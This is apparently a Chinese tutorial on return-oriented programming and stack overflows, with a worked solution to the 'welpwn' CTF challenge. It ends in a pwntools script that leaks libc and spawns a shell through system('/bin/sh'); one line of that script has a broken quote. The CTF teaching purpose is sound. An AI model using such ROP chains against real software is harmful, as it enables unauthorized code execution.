ROP全名返回导向编程，本质上是利用函数中的ret来进行函数的跳转。如果了解过反序列化构成pop链的同学可能对ROP更容易接受。

# 函数调用栈

我们学习ROP就需要非常了解函数调用栈的过程。当我们call一个函数的时候，它到底做了什么？我将会分成x86和x64分别进行讲解，因为这两者是有一些区别的。

## x86

首先我们先定义两个函数，调用别的函数的函数被称为caller，被调用的函数被称为callee。然后我们首先看caller的栈帧，栈帧就是指函数中ebp和esp之间的栈空间。  
![image.png](https://image.3001.net/images/20211021/1634805454_617126ce9805f42877464.png!small)  
然后caller有两个局部变量a和b，然后就会把它们放入栈中，我们要知道ESP永远指向栈的顶部，由于栈式从高地址往低地址延申，所以顶部就是低地址空间![image.png](https://image.3001.net/images/20211021/1634805580_6171274cc2eeac5ebdc60.png!small)  
然后caller函数准备进行函数调用，假设函数调用的参数列表位callee(int s1,int
s2)，那么会先将参数放入栈中，并且是按照从右往左的方式进行push![image.png](https://image.3001.net/images/20211021/1634805728_617127e0caf8c5895892a.png!small)  
然后我们函数调用的准备就做好了，然后我们就可以使用call指令,call指令的本质就是将EIP寄存器放入栈中,并且跳转到callee。进入callee函数之后,callee函数也会构建栈帧．首先push
ebp,由于ebp没有被修改过,所以这个ebp其实也是caller的ebp．这就是为了在callee调用完以后回复ebp的.然后进行mov ebp
esp,将esp的值复制到ebp,这样就移动了ebp![image.png](https://image.3001.net/images/20211021/1634807687_61712f8730c6577406c4f.png!small).然后剩下的操作就和caller异曲同工了。然后当callee结束的时候,会pop
ebp，于是ebp回到了底部,然后执行ret指令回到主函数，并且pop EIP.这样就完整的执行了一次函数。

## x86-64

64位的操作系统其实和32位操作系统是差不多的,但是在函数调用的时候，函数的参数不再放进栈中。前六位参数从左往右依次放入RDI、RSI、RDX、RCX、R8、R9，剩下的再往栈中存放。

# 栈溢出

ROP通常是在栈溢出的时候进行使用，然后我们看一下溢出到底是干什么的。首先我们有一个函数callee，然后其中有一个字符串buf，并且buf只能容纳40字节，然后我们往buf中输入字符串，但是没有进行检查。这样会有什么样的效果呢？我们首先让它容纳满我们所定义的大小也就是40个字节。![image.png](https://image.3001.net/images/20211021/1634811582_61713ebe12af5d3e78eae.png!small)  
那么如果我们继续输入的话会怎么样呢？首先会覆盖掉EBP，但是这个没什么,关键是可以覆盖掉后面的EIP.EIP是指令寄存器。里面存放着函数返回以后进行的下一条指令。那么我们就可以对EIP进行覆盖，覆盖为我们想要的地址，比如说system。

# 经典ROP

一般情况下我们是无法直接返回到system的，首先程序中，一般不会出现system函数。而且现在还有很多二进制的保护，我们无法直接使用代码段的system。甚至我们不知道程序的glibc版本。在这种情况下我们就需要构建ROP链。

同样我们需要把存在溢出的缓冲区填满，然后覆盖掉RBP，然后我们就可以在EIP处做文章了。例如可以通过泄露函数地址来泄露libc基址。因为glibc库中的函数只有偏移量，只有在运行的过程中才会加载到程序中，获得虚拟地址。而偏移量只有十六进制中的后三位，所以我们可以用它来获得libc基址和glibc的版本。

再来说一下gadget，gadget从狭义上来说是pop|ret的组合，从广义上来说，不仅仅pop|ret，包括mov|ret、jmp|ret都可以成为gadget，gadget的作用就是在你构建ROP的过程中需要一些资源(比如说寄存器)就可以通过gadget来获得。最关键的地方在于ret，也就是说我们覆盖掉RBP以后，调用gadget，由于gadget里面也有ret指令，我们还可以继续调用gadget或者是调用函数。也就是说我们几乎可以做任何我们想做的事情。

# 例题

我们可以来看一下一道经典的ROP的题目，攻防世界的welpwn![image.png](https://image.3001.net/images/20211021/1634816054_61715036788a2bd79f0c9.png!small)  
![image.png](https://image.3001.net/images/20211021/1634816067_61715043a8fef9c98e083.png!small)  
有用的就是两个函数．我们先来看一下函数的内容．首先创建了一个字符串（现在在IDA中显示的是char类型,但是很明显和RBP有0x400的距离,说明是字符串,不要完全相信它的反汇编）,然后输入最多0x400个字符,然后调用了一个函数

我们来看echo函数,首先有一个字符数组,只有16字节。然后将buf中的字符全部给到s2中，然后进行比较。最后输出。但是需要注意这里的for循环,如果是00的话将会跳出循环,但是由于我们是64位操作系统,输入地址的话难免会有00的出现,然后我们就需要想办法绕过。其实我们可以先粗略的画一个栈的图来看一下![image.png](https://image.3001.net/images/20211021/1634817559_617156173af474d274f39.png!small)  
栈中的空间大概是这个样子的,就算略微有点出入也没有关系。我们可以看到s2和buf之间几乎是相邻存放的。这样我们就有了操作的空间。我们知道我们只有一次覆盖EIP的机会.因为覆盖掉EIP之后的00就会直接将复制截断。

现在我们就有想法了，只要不通过复制，我们直接通过buf中输入地址然后执行就可以了。然后我们看一下我们应该输入什么内容：首先我们应该把s2和RBP填满，比方说填入24个A字符。于是就会成为这样![image.png](https://image.3001.net/images/20211021/1634826059_6171774b07732cd47240c.png!small)  
然后我们覆盖EIP,我们要想想如何覆盖,我们只有一次机会,那么我们就将下一次执行的指令放到buf中![image.png](https://image.3001.net/images/20211021/1634826169_617177b9762a9782b1a3d.png!small)  
然后函数调用结束后执行ret,ret返回到pop4_ret上。这个pop4_ret是指pop出以8字节为一组，一共四组的内容。然后ret就会到达buf+32的位置上。为什么会到这个位置上？我们首先要知道gadget本身其实是程序提供的，现在只不过是被我们利用了而已。所以说首先pop4个寄存器，最后进行ret，其过程其实就和函数调用结束没什么区别。同时ret指令也没有改变,本质上就是pop
EIP,所以会把buf+32中的地址给pop掉。

接下来我们就可以继续使用gadget了。这道题我们还不知道libc的版本，于是我们考虑泄露一下函数的地址。接着之前的pop4_ret我们后面可以跟上pop3_ret然后向寄存器中输入数值。然后我们使用libcsearcher或者是DynELF工具就可以爆出glibc的版本，然后我们就知道了system的地址。

    
    
    from pwn import *
    from LibcSearcher import *
    context(os= 'linux', arch = 'amd64', log_level = 'debug')
    content = 0
    elf = ELF("./../攻防世界/pwn高手区/welpwn.elf")
    write_got = elf.got["write"]
    puts_plt=elf.plt["puts"]
    main_addr = elf.symbols["main"]
    
    popx4_ret=0x40089c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    pop_rdi_ret=0x4008a3 # pop rdi ; ret
    
    
    io = process(./welpwn")
    
    def main():
        payload = b"A"*(0x10+8)+p64(popx4_ret)
        payload = payload + p64(pop_rdi_ret) + p64(write_got) + p64(puts_plt)
        payload = payload + p64(main_addr)
        
        io.recvuntil('Welcome to RCTF\n')
        io.sendline(payload)
    
        print(3)
        print(io.recvuntil(b'A'*(0x10+8)))
        print(io.recv(3))
    
        write_addr=u64(io.recv(6).ljust(8,b'\x00'))
        log.info("write_addr=>%#x",write_addr)
        
        libc = LibcSearcher('write', write_addr)
    
        libc_addr = write_addr - libc.dump('write')
        system_addr = libc_addr + libc.dump('system')
        binsh_addr = libc_addr + libc.dump('str_bin_sh')
    
        payload = b'A' * (0x10 + 8) + p64(popx4_ret)
        payload = payload + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
        
        io.send(payload)
        io.interactive()
    main()
    

这里直接给出WP

# 总结

通过这道题相信大家对ROP有了一定的了解,ROP就是通过函数结束时的ret指令,进行跳转。但是RIP被我们所覆盖，跳转到了我们想要的位置。而且我们能够利用的数据也只有函数提供的数据，即使是gadget，也是程序的制作者在调用函数的时候，函数调用快要结束对寄存器里的数据进行恢复。而且我们看待gadget也不能太过于狭隘，所有能够ret的都属于gadget，关键是看我们如何灵活的去利用

